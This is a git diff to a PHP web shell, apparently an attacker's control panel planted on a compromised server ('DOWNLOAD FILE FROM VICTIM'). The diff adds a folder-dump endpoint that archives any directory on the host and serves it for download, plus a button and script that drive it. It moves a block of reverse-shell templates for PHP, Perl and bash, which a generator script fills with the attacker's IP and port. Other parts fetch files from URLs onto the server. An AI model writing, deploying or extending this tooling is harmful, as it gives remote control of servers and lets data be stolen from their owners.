@@ -247,14 +247,6 @@ function is_in_docker(): int
     return intval(($score / $max_score) * 100);
 }
 
-if (isset($_GET['path'])) {
-    $path = $_GET['path'];
-    if (is_dir($path)) {
-        listDirectory($path);
-    }
-    exit;
-}
-
 function listDirectory($path) {
     $path = realpath($path);
     if (!$path || !is_dir($path)) return;
@@ -290,6 +282,79 @@ function listDirectory($path) {
         }
     }
     echo '</ul>';
+}
+// ! FUNCTIONS STOP
+
+// ? VARIABLES START
+$available_ce_methods = check_command_execution();
+$services = [
+    'NetCat' => [
+        'status' => check_install('nc -h', 'connect to somewhere:', $available_ce_methods),
+        'version' => get_regex_version('nc -h', '/\[(v[^\]]+)\]/', $available_ce_methods)
+    ],
+    'SSH' => [
+        'status' => check_install('ssh', 'usage: ssh', $available_ce_methods),
+        'version' => get_regex_version('ssh -V', '/OpenSSH_([\d\.p]+)/', $available_ce_methods)
+    ],
+    'MySQL' => [
+        'status' => check_install('mysql --version', 'mysql from ', $available_ce_methods),
+        'version' => get_regex_version('mysql --version', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
+    ],
+    'MariaDB' => [
+        'status' => check_install('mariadb --version', 'mariadb from ', $available_ce_methods),
+        'version' => get_regex_version('mariadb --version', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
+    ],
+    'PostgreSQL' => [
+        'status' => check_install('psql --help', 'psql is the PostgreSQL', $available_ce_methods),
+        'version' => get_regex_version('psql --version', '/psql \(PostgreSQL\) ([\d\.]+) /', $available_ce_methods)
+    ],
+    'Python' => [
+        'status' => check_install('python --help', 'usage: python', $available_ce_methods),
+        'version' => execute_command('python --version', $available_ce_methods),
+        'shell' => 'a'
+    ],
+    'PHP' => [
+        'status' => check_install('php --help', 'Usage: php', $available_ce_methods),
+        'version' => get_regex_version('php --version', '/PHP\s+([\d\.]+)/', $available_ce_methods),
+        'shell' => 'php -r \'$sock=fsockopen("IP",PORT);system("bash <&3 >&3 2>&3");\''
+    ],
+    'Perl' => [
+        'status' => check_install('perl --help', 'Usage: perl', $available_ce_methods),
+        'version' => get_regex_version('perl --version', '/\(v([\d\.]+)\)/', $available_ce_methods),
+        'shell' => 'perl -e \'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};\''
+    ],    
+    'Ruby' => [
+        'status' => check_install('ruby --help', 'ruby [switches]', $available_ce_methods),
+        'version' => get_regex_version('ruby --version', '/ruby\s+([\d\.]+)p\d+/', $available_ce_methods),
+        'shell' => 'a'
+    ],
+    'bash' => [
+        'status' => check_install('bash --version', 'GNU bash,', $available_ce_methods),
+        'version' => get_regex_version('bash --version', '/version\s+([\d\.]+)\(/', $available_ce_methods),
+        'shell' => 'bash -i >& /dev/tcp/IP/PORT 0>&1'
+    ],
+    'cURL' => [
+        'status' => check_install('curl --help', 'Usage: curl', $available_ce_methods),
+        'version' => get_regex_version('curl --version', '/\bcurl\s+([\d\.]+)\b/', $available_ce_methods)
+    ],
+    'wget' => [
+        'status' => check_install('wget --help', 'Usage: wget', $available_ce_methods),
+        'version' => get_regex_version('wget --version', '/GNU Wget\s+([\d\.]+)/', $available_ce_methods)
+    ],
+    'Docker' => [
+        'status' => check_install('docker --help', 'Usage:  docker', $available_ce_methods),
+        'version' => get_regex_version('docker --version', '/Docker version ([\d\.]+)/', $available_ce_methods)
+    ]
+];
+
+// ! VARIABLES STOP
+// ? FUNCTIONALITIES START
+if (isset($_GET['path'])) {
+    $path = $_GET['path'];
+    if (is_dir($path)) {
+        listDirectory($path);
+    }
+    exit;
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && isset($_POST['uploadPath'])) {
@@ -360,7 +425,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET'
 
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download'])) {
     /* DOWNLOAD FILE FROM VICTIM */
-    
+
     $filePath = realpath($_GET['download']);
 
     // Optionally restrict base directory:
@@ -383,71 +448,45 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download'])) {
     readfile($filePath);
     exit;
 }
-// ! FUNCTIONS STOP
 
-// ? VARIABLES START
-$available_ce_methods = check_command_execution();
-$services = [
-    'NetCat' => [
-        'status' => check_install('nc -h', 'connect to somewhere:', $available_ce_methods),
-        'version' => get_regex_version('nc -h', '/\[(v[^\]]+)\]/', $available_ce_methods)
-    ],
-    'SSH' => [
-        'status' => check_install('ssh', 'usage: ssh', $available_ce_methods),
-        'version' => get_regex_version('ssh -V', '/OpenSSH_([\d\.p]+)/', $available_ce_methods)
-    ],
-    'MySQL' => [
-        'status' => check_install('mysql --version', 'mysql from ', $available_ce_methods),
-        'version' => get_regex_version('mysql --version', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
-    ],
-    'MariaDB' => [
-        'status' => check_install('mariadb --version', 'mariadb from ', $available_ce_methods),
-        'version' => get_regex_version('mariadb --version', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
-    ],
-    'PostgreSQL' => [
-        'status' => check_install('psql --help', 'psql is the PostgreSQL', $available_ce_methods),
-        'version' => get_regex_version('psql --version', '/psql \(PostgreSQL\) ([\d\.]+) /', $available_ce_methods)
-    ],
-    'Python' => [
-        'status' => check_install('python --help', 'usage: python', $available_ce_methods),
-        'version' => execute_command('python --version', $available_ce_methods),
-        'shell' => 'a'
-    ],
-    'PHP' => [
-        'status' => check_install('php --help', 'Usage: php', $available_ce_methods),
-        'version' => get_regex_version('php --version', '/PHP\s+([\d\.]+)/', $available_ce_methods),
-        'shell' => 'php -r \'$sock=fsockopen("IP",PORT);system("bash <&3 >&3 2>&3");\''
-    ],
-    'Perl' => [
-        'status' => check_install('perl --help', 'Usage: perl', $available_ce_methods),
-        'version' => get_regex_version('perl --version', '/\(v([\d\.]+)\)/', $available_ce_methods),
-        'shell' => 'perl -e \'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};\''
-    ],    
-    'Ruby' => [
-        'status' => check_install('ruby --help', 'ruby [switches]', $available_ce_methods),
-        'version' => get_regex_version('ruby --version', '/ruby\s+([\d\.]+)p\d+/', $available_ce_methods),
-        'shell' => 'a'
-    ],
-    'bash' => [
-        'status' => check_install('bash --version', 'GNU bash,', $available_ce_methods),
-        'version' => get_regex_version('bash --version', '/version\s+([\d\.]+)\(/', $available_ce_methods),
-        'shell' => 'bash -i >& /dev/tcp/IP/PORT 0>&1'
-    ],
-    'cURL' => [
-        'status' => check_install('curl --help', 'Usage: curl', $available_ce_methods),
-        'version' => get_regex_version('curl --version', '/\bcurl\s+([\d\.]+)\b/', $available_ce_methods)
-    ],
-    'wget' => [
-        'status' => check_install('wget --help', 'Usage: wget', $available_ce_methods),
-        'version' => get_regex_version('wget --version', '/GNU Wget\s+([\d\.]+)/', $available_ce_methods)
-    ],
-    'Docker' => [
-        'status' => check_install('docker --help', 'Usage:  docker', $available_ce_methods),
-        'version' => get_regex_version('docker --version', '/Docker version ([\d\.]+)/', $available_ce_methods)
-    ]
-];
+if (isset($_GET['dump'])) {
+    $path = realpath($_GET['dump']);
 
-// ! VARIABLES STOP
+    if (!$path || !is_dir($path)) {
+        http_response_code(400);
+        exit('Invalid path');
+    }
+
+    $archiveName = basename($path) . '_' . time() . '.tar.gz';
+    $archivePath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $archiveName;
+
+    $escapedDir = escapeshellarg(dirname($path));
+    $escapedBase = escapeshellarg(basename($path));
+    $escapedOut = escapeshellarg($archivePath);
+
+    $command = "cd $escapedDir && tar -czf $escapedOut $escapedBase";
+
+    // Try all available methods to execute the archive command
+    $result = execute_command($command, ['shell_exec', 'exec', 'system', 'passthru', 'popen']);
+
+    // Validate archive creation
+    if (!file_exists($archivePath)) {
+        http_response_code(500);
+        exit("Failed to create archive. Output:\n$result");
+    }
+
+    // Serve the archive
+    header('Content-Type: application/gzip');
+    header('Content-Disposition: attachment; filename="' . basename($archivePath) . '"');
+    header('Content-Length: ' . filesize($archivePath));
+    readfile($archivePath);
+
+    // Clean up
+    unlink($archivePath);
+    exit;
+}
+
+// ! FUNCTIONALITIES STOP
 
 // ? DISPLAY FUNCTIONs START
 // ! DISPLAY FUNCTIONS STOP
@@ -492,7 +531,7 @@ $services = [
             box-sizing: border-box;
         }
         input[type="file"]{
-            width: 200px !important;
+            width: 300px !important;
         }
         .btn {
             background: #333;
@@ -625,9 +664,23 @@ $services = [
             color: #888;
             font-family: monospace;
         }
+
+        #loading-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            display: hidden;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5em;
+            color: #eee;
+            user-select: none;
+        }
     </style>
 </head>
 <body>
+    <div id="loading-overlay" style="display:none;">Dumping folder... (This will take a long time. Go make some coffee or take a shit...)</div>
     <div class="grid">
         <div class="card">
             <!-- Services, Auto Revshell Generator -->
@@ -681,14 +734,11 @@ $services = [
                     <input id="urlUploadName" type="text" placeholder="File Name:">
                     <input id="urlUploadSubmit" class="btn" type="button" value="Submit">
                 </div>
-                <button class="btn">Download</button>
-                <button class="btn">Dump&nbsp;Folder</button>
-                <button class="btn">Clean&nbsp;Up</button>
+                <button class="btn" id="dumpFolder">Dump&nbsp;Folder</button>
+                <!-- <button class="btn">Clean&nbsp;Up</button> Still have to figure this one out -->
             </div>
         </div>
         <div class="card span-column">Execute, Command History</div>
-        
-        
     </div>
 </body>
 
@@ -702,136 +752,136 @@ $services = [
     }
 </script>
 <script>
-    document.getElementById('uploadFileInput').addEventListener('change', function() {
-        const fileInput = document.getElementById('uploadFileInput');
-        const file = fileInput.files[0];
-        if (!file) return;
+document.getElementById('uploadFileInput').addEventListener('change', function() {
+    const fileInput = document.getElementById('uploadFileInput');
+    const file = fileInput.files[0];
+    if (!file) return;
 
-        const selectedPath = document.getElementById('selectedPath').value || '/';
+    const selectedPath = document.getElementById('selectedPath').value || '/';
 
-        const formData = new FormData();
-        formData.append('uploadFile', file);
-        formData.append('uploadPath', selectedPath);
+    const formData = new FormData();
+    formData.append('uploadFile', file);
+    formData.append('uploadPath', selectedPath);
 
-        fetch(window.location.pathname, {
-            method: 'POST',
-            body: formData
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.success) {
-                alert('Upload successful!');
-                fileInput.value = '';
+    fetch(window.location.pathname, {
+        method: 'POST',
+        body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.success) {
+            alert('Upload successful!');
+            fileInput.value = '';
 
-                // Find the currently selected folder and its nested <ul> to refresh
-                const selectedFolder = document.querySelector('.folder.selected');
-                if (selectedFolder) {
-                    const nested = selectedFolder.nextElementSibling;
-                    if (nested) {
-                        refreshFolder(selectedPath, nested);
-                    }
+            // Find the currently selected folder and its nested <ul> to refresh
+            const selectedFolder = document.querySelector('.folder.selected');
+            if (selectedFolder) {
+                const nested = selectedFolder.nextElementSibling;
+                if (nested) {
+                    refreshFolder(selectedPath, nested);
                 }
-            } else {
-                alert('Upload error: ' + data.error);
             }
-        })
-        .catch(err => {
-            alert('Upload failed: ' + err.message);
-        });
-    });
-</script>
-<script>
-    document.getElementById('file-tree').addEventListener('click', function (e) {
-        if (e.target.classList.contains('folder')) {
-            const el = e.target;
-            const path = el.getAttribute('data-path');
-            const parent = el.parentElement;
-
-            // Deselect previous
-            document.querySelectorAll('.folder.selected').forEach(f => f.classList.remove('selected'));
-            el.classList.add('selected');
-            selectedDir = path;
-            document.getElementById('selectedPath').value = path;
-
-            // Toggle display
-            parent.classList.toggle('open');
-
-            const nested = el.nextElementSibling;
-
-            // Refresh folder view
-            refreshFolder(path, nested);
-        }
-    });
-</script>
-<script>
-    function genShell(shellTemplate) {
-        const ip = document.getElementById('revshell_ip')?.value || '';
-        const port = document.getElementById('revshell_port')?.value || '';
-        const outputBlock = document.getElementById('revshell');
-
-        if (!ip || !port) {
-            alert("Please provide both IP and PORT.");
-            return;
-        }
-
-        const finalShell = shellTemplate
-            .replace(/IP/g, ip)
-            .replace(/PORT/g, port);
-
-        if (outputBlock) {
-            outputBlock.textContent = finalShell;
         } else {
-            console.warn('Output element with ID "revshell" not found.');
+            alert('Upload error: ' + data.error);
         }
-    }
+    })
+    .catch(err => {
+        alert('Upload failed: ' + err.message);
+    });
+});
 </script>
 <script>
-    document.getElementById('urlUploadSubmit').addEventListener('click', () => {
-        const url = document.getElementById('urlUpload').value.trim();
-        const fileName = document.getElementById('urlUploadName').value.trim();
-        const uploadPath = document.getElementById('selectedPath').value || '/';
+document.getElementById('file-tree').addEventListener('click', function (e) {
+    if (e.target.classList.contains('folder')) {
+        const el = e.target;
+        const path = el.getAttribute('data-path');
+        const parent = el.parentElement;
 
-        if (!url || !fileName) {
-            alert('Please enter both URL and file name.');
-            return;
-        }
+        // Deselect previous
+        document.querySelectorAll('.folder.selected').forEach(f => f.classList.remove('selected'));
+        el.classList.add('selected');
+        selectedDir = path;
+        document.getElementById('selectedPath').value = path;
 
-        // Encode params for GET request
-        const params = new URLSearchParams({
-            urlUpload: url,
-            urlUploadName: fileName,
-            uploadPath: uploadPath,
-        });
+        // Toggle display
+        parent.classList.toggle('open');
 
-        fetch(`${window.location.pathname}?${params.toString()}`, {
-            method: 'GET',
-            headers: { 'Accept': 'application/json' }
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.success) {
-                alert('URL upload successful!');
-                // Clear inputs
-                document.getElementById('urlUpload').value = '';
-                document.getElementById('urlUploadName').value = '';
+        const nested = el.nextElementSibling;
 
-                // Optionally refresh folder view here, like after file upload
-                const selectedFolder = document.querySelector('.folder.selected');
-                if (selectedFolder) {
-                    const nested = selectedFolder.nextElementSibling;
-                    if (nested) {
-                        refreshFolder(uploadPath, nested);
-                    }
-                }
+        // Refresh folder view
+        refreshFolder(path, nested);
+    }
+});
+</script>
+<script>
+function genShell(shellTemplate) {
+    const ip = document.getElementById('revshell_ip')?.value || '';
+    const port = document.getElementById('revshell_port')?.value || '';
+    const outputBlock = document.getElementById('revshell');
 
-            } else {
-                alert('URL upload error: ' + data.error);
-            }
-        })
-        .catch(err => {
-            alert('URL upload failed: ' + err.message);
-        });
+    if (!ip || !port) {
+        alert("Please provide both IP and PORT.");
+        return;
+    }
+
+    const finalShell = shellTemplate
+        .replace(/IP/g, ip)
+        .replace(/PORT/g, port);
+
+    if (outputBlock) {
+        outputBlock.textContent = finalShell;
+    } else {
+        console.warn('Output element with ID "revshell" not found.');
+    }
+}
+</script>
+<script>
+document.getElementById('urlUploadSubmit').addEventListener('click', () => {
+    const url = document.getElementById('urlUpload').value.trim();
+    const fileName = document.getElementById('urlUploadName').value.trim();
+    const uploadPath = document.getElementById('selectedPath').value || '/';
+
+    if (!url || !fileName) {
+        alert('Please enter both URL and file name.');
+        return;
+    }
+
+    // Encode params for GET request
+    const params = new URLSearchParams({
+        urlUpload: url,
+        urlUploadName: fileName,
+        uploadPath: uploadPath,
     });
+
+    fetch(`${window.location.pathname}?${params.toString()}`, {
+        method: 'GET',
+        headers: { 'Accept': 'application/json' }
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.success) {
+            alert('URL upload successful!');
+            // Clear inputs
+            document.getElementById('urlUpload').value = '';
+            document.getElementById('urlUploadName').value = '';
+
+            // Optionally refresh folder view here, like after file upload
+            const selectedFolder = document.querySelector('.folder.selected');
+            if (selectedFolder) {
+                const nested = selectedFolder.nextElementSibling;
+                if (nested) {
+                    refreshFolder(uploadPath, nested);
+                }
+            }
+
+        } else {
+            alert('URL upload error: ' + data.error);
+        }
+    })
+    .catch(err => {
+        alert('URL upload failed: ' + err.message);
+    });
+});
 </script>
 <script>
 document.getElementById('file-tree').addEventListener('dblclick', function (e) {
@@ -849,6 +899,39 @@ document.getElementById('file-tree').addEventListener('dblclick', function (e) {
     }
 });
 </script>
+<script>
+document.getElementById('dumpFolder').addEventListener('click', function() {
+    const selectedPath = document.getElementById('selectedPath').value || '/';
+    const overlay = document.getElementById('loading-overlay');
+
+    overlay.style.display = 'flex'; // show loading
+
+    // Send request to dump and get the file as a blob
+    fetch(window.location.pathname + '?dump=' + encodeURIComponent(selectedPath))
+        .then(response => {
+            if (!response.ok) throw new Error('Network response was not OK');
+            return response.blob();
+        })
+        .then(blob => {
+            // Create a temporary download link
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = selectedPath.replace(/[\/\\]/g, '_') + '.tar.gz';
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+            window.URL.revokeObjectURL(url);
+        })
+        .catch(err => {
+            alert('Failed to download archive: ' + err.message);
+        })
+        .finally(() => {
+            overlay.style.display = 'none'; // hide loading after everything
+        });
+});
+</script>
+
 </html>
 <?php
 
